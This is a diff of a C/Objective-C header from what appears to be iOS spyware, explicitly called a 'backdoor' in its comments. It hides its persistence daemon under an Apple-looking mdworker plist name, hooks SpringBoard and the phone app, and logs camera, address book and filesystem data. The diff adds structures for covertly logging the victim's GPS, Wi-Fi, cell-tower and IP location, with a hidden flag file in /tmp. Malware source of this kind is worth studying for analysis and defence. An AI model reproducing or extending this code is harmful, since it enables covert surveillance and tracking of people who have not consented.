@@ -68,6 +68,9 @@ typedef struct kinfo_proc kinfo_proc;
 #define BACKDOOR_DAEMON_PLIST @"/Library/LaunchDaemons/com.apple.mdworker.plist"
 #define SB_PATHNAME @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist"
 #define IT_PATHNAME @"/System/Library/LaunchDaemons/com.apple.itunesstored.plist"
+#define SPRINGBOARD_PLIST_PATH "/System/Library/LaunchDaemons/com.apple.SpringBoard.plist"
+#define ITUNESSTORE_PLIST_PATH "/System/Library/LaunchDaemons/com.apple.itunesstored.plist"
+
 
 #define LOG_PREFIX    @"LOGF"
 #define LOG_EXTENSION @".log"
@@ -101,6 +104,7 @@ typedef struct kinfo_proc kinfo_proc;
 
 // Hooked external apps Identifier
 #define SPRINGBOARD   @"com.apple.springboard"
+#define MOBILEPHONE   @"com.apple.mobilephone"
 #define NEWCONF       @"new_juice.mac"
 #define DELIMETER     0xABADC0DE
 
@@ -304,6 +308,13 @@ extern u_int remoteAgents[];
 #define LOG_CAMERA          0xE9E9
 #define LOG_APPLICATION     0x1011
 #define LOG_FILESYSTEM      0xEDA1
+#define LOGTYPE_LOCATION_NEW  0x1220
+// Sub-types del nuovo Location Log
+#define LOGTYPE_LOCATION_GPS    0x0001
+#define LOGTYPE_LOCATION_GSM    0x0002
+#define LOGTYPE_LOCATION_WIFI   0x0003
+#define LOGTYPE_LOCATION_IP     0x0004
+#define LOGTYPE_LOCATION_CDMA   0x0005
 
 // Only for iPhone
 #define LOG_ADDRESSBOOK     0x0250
@@ -395,6 +406,97 @@ typedef struct _device
 #define AGENT_DEV_NOTENABLED  0
   UInt32 isEnabled;
 } deviceStruct;
+
+#define GPS_MAX_SATELLITES 12
+typedef struct _FILETIME {
+  UInt32 dwLowDateTime;
+  UInt32 dwHighDateTime;
+} FILETIME, *PFILETIME;
+
+typedef struct _SYSTEMTIME {
+  UInt16 wYear;
+  UInt16 wMonth;
+  UInt16 wDayOfWeek;
+  UInt16 wDay;
+  UInt16 wHour;
+  UInt16 wMinute;
+  UInt16 wSecond;
+  UInt16 wMilliseconds;
+} SYSTEMTIME, *PSYSTEMTIME;
+
+typedef struct _GPS_POSITION {
+  UInt32 dwVersion;             // Current version of GPSID client is using.
+  UInt32 dwSize;                // sizeof(_GPS_POSITION)
+  
+  // Not all fields in the structure below are guaranteed to be valid.  
+  // Which fields are valid depend on GPS device being used, how stale the API allows
+  // the data to be, and current signal.
+  // Valid fields are specified in dwValidFields, based on GPS_VALID_XXX flags.
+  UInt32 dwValidFields;
+  
+  // Additional information about this location structure (GPS_DATA_FLAGS_XXX)
+  UInt32 dwFlags;
+  
+  //** Time related
+  SYSTEMTIME stUTCTime;   //  UTC according to GPS clock.
+  
+  //** Position + heading related
+  double dblLatitude;            // Degrees latitude.  North is positive
+  double dblLongitude;           // Degrees longitude.  East is positive
+  float  flSpeed;                // Speed in knots
+  float  flHeading;              // Degrees heading (course made good).  True North=0
+  double dblMagneticVariation;   // Magnetic variation.  East is positive
+  float  flAltitudeWRTSeaLevel;  // Altitute with regards to sea level, in meters
+  float  flAltitudeWRTEllipsoid; // Altitude with regards to ellipsoid, in meters
+  
+  //** Quality of this fix
+  UInt32     FixQuality;        // Where did we get fix from?
+  UInt32        FixType;           // Is this 2d or 3d fix?
+  UInt32   SelectionType;     // Auto or manual selection between 2d or 3d mode
+  float flPositionDilutionOfPrecision;   // Position Dilution Of Precision
+  float flHorizontalDilutionOfPrecision; // Horizontal Dilution Of Precision
+  float flVerticalDilutionOfPrecision;   // Vertical Dilution Of Precision
+  
+  //** Satellite information
+  UInt32 dwSatelliteCount;                                            // Number of satellites used in solution
+  UInt32 rgdwSatellitesUsedPRNs[GPS_MAX_SATELLITES];                  // PRN numbers of satellites used in the solution
+  
+  UInt32 dwSatellitesInView;                                          // Number of satellites in view.  From 0-GPS_MAX_SATELLITES
+  UInt32 rgdwSatellitesInViewPRNs[GPS_MAX_SATELLITES];                // PRN numbers of satellites in view
+  UInt32 rgdwSatellitesInViewElevation[GPS_MAX_SATELLITES];           // Elevation of each satellite in view
+  UInt32 rgdwSatellitesInViewAzimuth[GPS_MAX_SATELLITES];             // Azimuth of each satellite in view
+  UInt32 rgdwSatellitesInViewSignalToNoiseRatio[GPS_MAX_SATELLITES];  // Signal to noise ratio of each satellite in view
+} GPS_POSITION, *PGPS_POSITION;
+
+typedef struct _LocationAdditionalData {
+	UInt32 uVersion;
+#define LOG_LOCATION_VERSION (UInt32)2010082401
+	UInt32 uType;
+	UInt32 uStructNum;
+} LocationAdditionalData, *pLocationAdditionalData;
+
+typedef struct _GPSInfo {
+  UInt32 type;
+  UInt32 uSize;
+  UInt32 uVersion;
+  FILETIME ft;
+  GPS_POSITION gps;
+  UInt32 dwDelimiter;
+} GPSInfo;
+
+typedef struct _WiFiInfo {
+  char    MacAddress[6];    // BSSID
+  char    Pad[2];           // Pad, ignored
+  UInt32  uSsidLen;          // SSID length
+  char    Ssid[32];         // SSID
+  UInt32  iRssi;              // Received signal strength in _dBm_
+} WiFiInfo;
+
+#define GPS_FLAG_FILEPATH @"/tmp/6a77h7a9.6l7"
+#define POS_MODULES_ALL_DISABLE 0
+#define POS_MODULES_GPS_ENABLE  1
+#define POS_MODULES_WIF_ENABLE  2
+#define POS_MODULES_CEL_ENABLE  8
 
 //typedef struct _logDownload {
   //u_int version;
@@ -509,14 +611,14 @@ typedef union {
 //
 // Global variables required by the backdoor
 //
-extern char     gLogAesKey[];
-extern char     gConfAesKey[];
-extern char     gInstanceId[];
-extern char     gBackdoorID[];
-extern char     gBackdoorSignature[];
-extern char     gConfName[];
-extern char     gDemoMarker[];
-extern u_int    gVersion;
+//extern char     gLogAesKey[];
+//extern char     gConfAesKey[];
+//extern char     gInstanceId[];
+//extern char     gBackdoorID[];
+//extern char     gBackdoorSignature[];
+//extern char     gConfName[];
+//extern char     gDemoMarker[];
+//extern u_int    gVersion;
 extern FILE     *logFD;
 extern NSString *gDylibName;
 extern NSString *gBackdoorName;
